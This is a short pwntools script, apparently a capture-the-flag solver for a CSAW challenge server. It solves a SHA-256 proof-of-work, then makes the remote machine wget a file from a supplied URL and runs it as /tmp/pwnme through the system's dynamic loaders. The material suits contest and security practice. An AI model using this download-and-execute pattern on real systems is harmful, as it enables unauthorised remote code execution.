from pwn import *
import hashlib, time, sys
HOST,PORT='pwn.chal.csaw.io',5000

def solve(prefix):
    i=0
    while True:
        if hashlib.sha256(str(i).encode()).hexdigest().startswith(prefix):
            return str(i)
        i+=1

def main(url):
    io=remote(HOST,PORT)
    io.recvuntil(b'`./solve ', timeout=10)
    prefix=io.recvline().decode().strip().strip('`').split()[-1]
    io.sendline(solve(prefix).encode())
    io.recvuntil(b'wget', timeout=10)
    io.sendline(url.encode())
    print(io.recvuntil(b'/ $ ', timeout=30).decode('latin-1','replace'))

    def run(cmd, t=8):
        io.sendline(cmd)
        time.sleep(0.2)
        out=b''
        end=time.time()+t
        while time.time()<end:
            try:
                chunk=io.recv(timeout=0.5)
            except EOFError:
                break
            if chunk:
                out+=chunk
        print(out.decode('latin-1','replace'))
        if not io.connected():
            sys.exit(0)

    run(b'ls -l /tmp/pwnme')
    run(b'head -c 4 /tmp/pwnme | hexdump -C')
    run(b'/lib64/ld-linux-x86-64.so.2 /tmp/pwnme', t=10)
    run(b'/lib/ld-musl-x86_64.so.1 /tmp/pwnme', t=10)
    run(b'echo DONE')

if __name__=='__main__':
    main(sys.argv[1])

